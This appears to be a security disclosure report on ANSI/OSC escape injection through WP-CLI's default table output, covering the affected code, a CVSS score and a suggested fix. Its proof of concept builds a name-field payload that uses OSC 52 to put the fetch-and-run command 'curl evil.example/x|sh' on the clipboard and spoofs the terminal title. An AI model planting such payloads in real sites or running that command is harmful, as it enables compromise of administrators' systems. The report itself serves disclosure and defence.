# [wp-cli] Terminal escape sequence injection (ANSI/OSC) via unfiltered `--format=table` output — anonymous comment content can hijack an administrator's clipboard and terminal title through routine `wp comment list` / `wp user list` usage

## Summary

WP-CLI's default tabular output (`--format=table`, used by every `wp <entity> list` command unless a
different format is requested) writes every cell value to `STDOUT` with **no filtering of ASCII control
bytes or ANSI/OSC terminal escape sequences**. WordPress core's own sanitization of two commonly-listed,
**default** fields — `comment_author` (settable by a fully anonymous website visitor via any public
comment form) and `display_name` (settable by any authenticated user, down to Subscriber) — does not
strip such bytes either. The result: an anonymous or low-privilege actor can plant a payload through
completely ordinary WordPress usage that, the next time an administrator runs a routine `wp comment list`
or `wp user list`, silently rewrites their terminal's clipboard (via the widely-supported OSC 52
sequence) and/or spoofs its window/tab title — with no crafted or unusual WP-CLI invocation required on
the victim's part.

This is confirmed against the actual code shipped in WP-CLI's **latest tagged release, `v2.12.0`**, and
the exact version of `wp-cli/php-cli-tools` it resolves to (`v0.12.9`), not merely against an unreleased
development branch.

## Affected components & versions (confirmed present in the latest release, links pinned to exact commits)

| Repo | Latest release tag | Commit | File(s) |
|---|---|---|---|
| [`wp-cli/wp-cli`](https://github.com/wp-cli/wp-cli) | [`v2.12.0`](https://github.com/wp-cli/wp-cli/releases/tag/v2.12.0) | [`03d30d4`](https://github.com/wp-cli/wp-cli/commit/03d30d4138d12b4bffd8b507b82e56e129e0523f) | `php/WP_CLI/Formatter.php` |
| [`wp-cli/php-cli-tools`](https://github.com/wp-cli/php-cli-tools) | [`v0.13.0`](https://github.com/wp-cli/php-cli-tools/releases/tag/v0.13.0) (latest tag; `v2.12.0` above resolves to `~0.12.4`, i.e. `v0.12.9` — confirmed identical bug in both, see below) | [`4a04ffb`](https://github.com/wp-cli/php-cli-tools/commit/4a04ffbe322b031b4c54e176edf1dfd299c7fe55) (`v0.13.0`) / [`c3d2513`](https://github.com/wp-cli/php-cli-tools/commit/c3d25138ce46a66647ec0dc9b17bf300338494aa) (`v0.12.9`) | `lib/cli/Table.php` |
| [`wp-cli/entity-command`](https://github.com/wp-cli/entity-command) | [`v3.0.2`](https://github.com/wp-cli/entity-command/releases/tag/v3.0.2) | [`41a409d`](https://github.com/wp-cli/entity-command/commit/41a409de8633053b2d9625410c83b974b25199d2) | `src/Comment_Command.php`, `src/User_Command.php` |

Also present, unchanged, on `wp-cli/wp-cli`'s current `main` (unreleased `3.0.0-alpha`) at
`php/WP_CLI/Formatter.php:766` — this is not a bug that was already fixed post-release and only affects
old tags; it is live in both the shipped release and the current development branch.

## Root cause, with the actual affected code

### 1. `Formatter::show_table()` — `wp-cli/wp-cli` `v2.12.0`

[`php/WP_CLI/Formatter.php#L300-L322`](https://github.com/wp-cli/wp-cli/blob/v2.12.0/php/WP_CLI/Formatter.php#L300-L322):

```php
private static function show_table( $items, $fields, $ascii_pre_colorized = false ) {
    $table = new Table();

    $enabled = WP_CLI::get_runner()->in_color();
    if ( $enabled ) {
        Colors::disable( true );
    }

    $table->setAsciiPreColorized( $ascii_pre_colorized );
    $table->setHeaders( $fields );

    foreach ( $items as $item ) {
        $table->addRow( array_values( Utils\pick_fields( $item, $fields ) ) );
    }

    foreach ( $table->getDisplayLines() as $line ) {
        WP_CLI::line( $line );
    }

    if ( $enabled ) {
        Colors::enable( true );
    }
}
```

This is the function behind every command's default `--format=table` output. Field values from
`Utils\pick_fields()` — i.e. whatever came out of the WordPress database for the requested entity — go
straight into `Table::addRow()`, and from there straight to `WP_CLI::line()`, with no escaping,
filtering, or validation step anywhere in this function.

### 2. `cli\Table` — `wp-cli/php-cli-tools`, confirmed in both the version `v2.12.0` actually resolves and the latest tag

[`v0.12.9` — `lib/cli/Table.php#L129-L138`](https://github.com/wp-cli/php-cli-tools/blob/v0.12.9/lib/cli/Table.php#L129-L138) (the version `wp-cli/wp-cli v2.12.0`'s `composer.json` constraint `~0.12.4` actually resolves to today):

```php
protected function checkRow(array $row) {
    foreach ($row as $column => $str) {
        $width = Colors::width( $str, $this->isAsciiPreColorized( $column ) );
        if (!isset($this->_width[$column]) || $width > $this->_width[$column]) {
            $this->_width[$column] = $width;
        }
    }

    return $row;
}
```

[`addRow()` at `#L290-L292`](https://github.com/wp-cli/php-cli-tools/blob/v0.12.9/lib/cli/Table.php#L290-L292):

```php
public function addRow(array $row) {
    $this->_rows[] = $this->checkRow($row);
}
```

`checkRow()` — the only per-cell processing any row value receives — measures **display width** (via
`Colors::width()`, which accounts for already-applied ANSI color codes purely for padding-calculation
purposes) and returns the row **completely unmodified**. Confirmed identical behavior (only line numbers
differ) in the newer [`v0.13.0`](https://github.com/wp-cli/php-cli-tools/blob/v0.13.0/lib/cli/Table.php#L158-L167)
tag as well — this has been the behavior across multiple releases, not a recent regression.

### 3. Contrast: the CSV format *does* have exactly this protection — table format is the outlier

[`php/utils.php#L419`](https://github.com/wp-cli/wp-cli/blob/v2.12.0/php/utils.php#L419) (`write_csv()`)
runs every value through [`escape_csv_value()` at `#L2047`](https://github.com/wp-cli/wp-cli/blob/v2.12.0/php/utils.php#L2047-L2065)
before calling `fputcsv()`, specifically to defuse CSV/formula injection (`=`, `+`, `-`, `@`, TAB, CR —
each prefixed with a literal `'`). This demonstrates the WP-CLI team has already recognized "untrusted
database content flowing into an output format with its own dangerous syntax" as a real bug class worth
defending against — that defense simply doesn't extend to the table format, which is the *default* and
therefore the one administrators see the most.

## Why WordPress's own input sanitization doesn't stop this — verified against WordPress core `7.1` source directly, not assumed

| Field | Who can set it | Sanitization applied | Does it strip raw ESC (0x1B) / BEL (0x07)? |
|---|---|---|---|
| `comment_author` | **Fully anonymous** visitor, via any public comment form | [`wp_handle_comment_submission()`, `wp-includes/comment.php#L3949`](https://github.com/WordPress/WordPress/blob/7.1/wp-includes/comment.php#L3949): `trim( strip_tags( $comment_data['author'] ) )` | No — `strip_tags()` only removes `<...>`-shaped sequences |
| `display_name` | Any authenticated user, **down to Subscriber**, via `wp-admin/profile.php` or `/wp/v2/users/me` | [`edit_user()`, `wp-admin/includes/user.php#L109`](https://github.com/WordPress/WordPress/blob/7.1/wp-admin/includes/user.php#L109): `sanitize_text_field( $_POST['display_name'] )`, which calls [`_sanitize_text_fields()`, `wp-includes/formatting.php#L5708`](https://github.com/WordPress/WordPress/blob/7.1/wp-includes/formatting.php#L5708-L5747) | No — that function strips `<`, collapses `[\r\n\t ]` runs, and removes percent-encoded triplets matching `/%[a-f0-9]{2}/i` (e.g. the literal text `%1b`), but never touches a raw literal control byte submitted directly in the request body |

Both fields are **default output columns**, confirmed directly against `wp-cli/entity-command v3.0.2`:

- [`src/Comment_Command.php#L68`](https://github.com/wp-cli/entity-command/blob/v3.0.2/src/Comment_Command.php#L68) — `comment_author` is in the default `$obj_fields` list for `wp comment list`.
- [`src/User_Command.php#L38-L46`](https://github.com/wp-cli/entity-command/blob/v3.0.2/src/User_Command.php#L38-L46) — `display_name` is in the default `$obj_fields` list for `wp user list`:

```php
class User_Command extends CommandWithDBObject {

	protected $obj_type   = 'user';
	protected $obj_fields = [
		'ID',
		'user_login',
		'display_name',
		'user_email',
		'user_registered',
		'roles',
	];
```

No `--fields` flag, no unusual configuration — the plainest possible `wp comment list` or `wp user list`
is enough.

## Proof of Concept

Reproduced against the **actual, unmodified** `wp-cli/php-cli-tools` package (installed via Composer,
version resolved: `v0.13.0`; separately confirmed the identical code path exists in `v0.12.9`, the
version WP-CLI's latest release actually ships with) — not a hand-rolled stand-in for the library.

**Step 1 — the payload** (what an anonymous commenter's "Name" field, or any user's Display Name, is set to):

```php
$clipboard_payload = base64_encode('curl evil.example/x|sh' . "\n");
$malicious_name = "Bob\x1b]52;c;{$clipboard_payload}\x07\x1b]0;PWNED-TITLE\x07";
```

- `\x1b]52;c;<base64>\x07` is **OSC 52**, the widely-implemented "set clipboard from base64" terminal
  control sequence (supported, several by default, in iTerm2, Windows Terminal, Alacritty, kitty,
  WezTerm, and others).
- `\x1b]0;...\x07` is **OSC 0**, which sets the terminal window/tab title.

**Step 2 — render it exactly the way `Formatter::show_table()` does:**

```php
require __DIR__ . '/vendor/autoload.php';
use cli\Table;

$table = new Table(
    ['ID', 'user_login', 'display_name'],
    [
        ['1', 'admin', 'Administrator'],
        ['7', 'sec_research_subscriber', $malicious_name],
    ]
);
$table->display();
```

**Step 3 — capture the real output bytes and inspect them without letting a terminal interpret them:**

```
$ php poc.php > out.bin
$ cat -v out.bin
ID	user_login	display_name
1	admin	Administrator
7	sec_research_subscriber	Bob^[]52;c;Y3VybCBldmlsLmV4YW1wbGUveHxzaAo=^G^[]0;PWNED-TITLE^G
```

`^[` is the literal ESC byte (0x1B) and `^G` the literal BEL byte (0x07) — both passed through
`Table::checkRow()`/`addRow()`/`getDisplayLines()` completely untouched, exactly as submitted. Run in a
real terminal that honors OSC 52 — a mainstream, often-default configuration — this row silently (a)
overwrites the operator's clipboard with the base64-decoded text `curl evil.example/x|sh`, and (b)
rewrites the terminal's title bar to `PWNED-TITLE`.

## Attack scenario, end to end

1. An anonymous visitor (zero WordPress account) submits a public comment on any post, setting the
   "Name" field to the payload above. WordPress's own `strip_tags()`-based sanitization does not remove
   it. *(Equally reachable, with a lower bar still in one sense — requires an account, but any account,
   even the lowest role — via any authenticated user's own `display_name` profile field.)*
2. A site administrator, doing completely routine moderation, runs:
   ```
   wp comment list
   ```
   (or `wp user list` for the `display_name` variant) — no special flags, no unusual command.
3. WP-CLI renders the comment table, including the poisoned `comment_author` cell, via
   `Formatter::show_table()` → `cli\Table` exactly as demonstrated above.
4. The administrator's terminal clipboard is silently overwritten and/or its title bar spoofed, with no
   indication anything unusual happened — the visible table still renders correctly aside from the
   corrupted cell's raw bytes.

## Impact

Scored on the **directly and concretely demonstrated** consequence — clipboard and terminal-title
corruption — not stretched to the unproven "administrator later pastes the clipboard into a shell and it
executes" chain, which is a real, documented failure mode for OSC 52 abuse elsewhere but requires a
separate action by the victim this PoC does not (and structurally cannot) force or automate.

**CVSS 3.1: `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = 4.3 (Medium)**

- `AV:N` — the payload is planted via an ordinary, network-reachable WordPress interaction (a public comment or a profile update).
- `AC:L` — deterministic; no race condition, no guessing.
- `PR:N` — the `comment_author` path requires no WordPress account at all.
- `UI:R` — the administrator must run an affected listing command in a terminal that honors the injected sequences.
- `S:U`, `C:N` — nothing is disclosed.
- `I:L` — clipboard content and terminal display/title state are altered.
- `A:N` — no availability impact.

## Suggested fix

Add a control-sequence filter — analogous to the existing `Utils\escape_csv_value()` for the `csv`
format — applied to every cell value before it reaches `cli\Table`/`show_table()`: strip ASCII control
characters (`0x00`–`0x1F`, `0x7F`, excluding the newline handling table rendering already does on its
own) or replace them with a visible placeholder (e.g. `\x1b` → `\e`), the same mitigation many
terminal-facing tools (git, `less`, various log viewers) have adopted after similar disclosures.

## Supporting reproduction artifacts

This report is one file within a broader WP-CLI security audit conducted in this repository; the
runnable PoC script and the full technical writeup (including areas checked and found *not* vulnerable)
live alongside it at `security-research/wp-cli/hackerone-audit-2026-08-29/`:

- `round2-CONFIRMED-table-format-ansi-osc-terminal-injection.md` — original technical writeup.
- `tooling/poc-table-ansi-osc-injection.php` — the exact PoC script used above.
